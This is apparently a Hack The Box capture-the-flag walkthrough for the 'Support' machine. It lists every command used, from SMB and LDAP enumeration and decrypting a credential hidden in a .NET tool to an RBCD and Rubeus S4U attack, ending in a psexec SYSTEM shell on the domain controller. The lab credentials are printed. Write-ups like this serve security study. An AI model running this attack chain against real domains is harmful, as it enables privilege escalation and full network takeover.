# HTB Support

## Nmap

```bash
nmap -sC -sV -Pn support.htb -p- -oN support.txt
```

→ Key findings:

* LDAP (389)
* SMB (445)
* WinRM (5985)
* Domain: `support.htb`

---

## SMB Enumeration

```bash
smbclient -L //support.htb
```

→ Found share:

```text
support-tools
```

---

## Download files

```bash
smbclient //support.htb/support-tools
get UserInfo.exe
```

---

## Reverse Engineering (.NET)

Used **ILSpy** → extracted code

→ Found encrypted password
→ Used provided script:

```bash
python3 decrypt.py
```
```python
from base64 import b64decode
from Crypto.Cipher import AES
from hashlib import sha256

enc_password = "put_the_encrypted_string_here"

key = sha256(b"support").digest()
iv = b"\x00" * 16

cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(b64decode(enc_password))

# remove padding
password = decrypted.rstrip(b"\x00").decode()

print(password)
```

→ Got creds:

```text
ldap : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

---

## LDAP Enumeration

```bash
ldapsearch -x -H ldap://support.htb \
-D "ldap@support.htb" \
-w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
-b "dc=support,dc=htb"
```

→ Found:

```text
support user:
info: Ironside47pleasure40Watchful
```

---

## WinRM Access

```bash
evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
```

---

# BloodHound Enumeration

Collected with:

```powershell
.\SharpHound.exe
```

---

## Found Attack Path

```text
support
 → MemberOf → Shared Support Accounts
 → edge GenericAll → DC
```

Meaning:

* You control a group
* Group has **GenericAll on DC**
* Full domain compromise possible

---

# Resource-Based Constrained Delegation-   RBCD Attack

## Check MachineAccountQuota to add a machine

```powershell
Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
```

→ `10` (allowed)

---

## Upload tools

```powershell
upload PowerView.ps1
upload Powermad.ps1
```

```powershell
. .\PowerView.ps1
. .\Powermad.ps1
```

---

## Create machine account

```powershell
New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
```

---

## Configure RBCD

```powershell
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
```

---

## Get Kerberos ticket (Rubeus)

Upload:

```powershell
upload Rubeus.exe
```

---

### Generate hash

```powershell
.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
```

→ RC4:

```text
58A478135A93AC3BF058A5EA0E8FDB71
```

---

### S4U attack - Kerberos extensions that allows a services to request tickets on behalf of a user

```powershell
.\Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
```

---

## Dump ticket and copy to attack host

```powershell
.\Rubeus.exe dump /nowrap
```

→ Copy `Base64EncodedTicket`

---

## Convert ticket

```bash
base64 -d ticket.kirbi > ticket.bin
impacket-ticketConverter ticket.bin ticket.ccache
export KRB5CCNAME=ticket.ccache
```

---

## Get SYSTEM shell

```bash
impacket-psexec support.htb/Administrator@dc.support.htb -k -no-pass
```

---

## Root flag

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

# Key Takeaways

* LDAP leaks credentials via `.NET app`
* BloodHound → **critical for AD attack paths**
* `GenericAll` on DC = full compromise
* RBCD = **powerful AD abuse technique**
* Kerberos tickets can be:

  * injected (Rubeus)
  * exported → reused (Impacket)

---
